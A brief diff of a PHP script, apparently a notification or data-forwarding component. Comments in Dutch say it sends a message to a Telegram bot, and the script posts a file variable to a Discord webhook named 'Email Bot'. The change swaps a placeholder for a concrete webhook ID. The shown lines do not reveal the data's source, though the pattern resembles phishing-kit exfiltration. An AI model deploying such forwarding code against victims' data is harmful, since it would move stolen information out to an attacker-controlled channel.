@@ -32,7 +32,7 @@ $telegramchatid=yourtelegramchatidhere;
 // verstuurd het bericht [english: sends the message to your telegram bot]
 telegram ("$txt");
 // discord webhook 
-$url = "https://discordapp.com/api/webhooks/xxxxxxxx";
+$url = "https://discordapp.com/api/webhooks/298350776231657475";
 $headers = [ 'Content-Type: application/json; charset=utf-8' ];
 $POST = [ 'username' => 'Email Bot', 'content' => "$file" ];
 
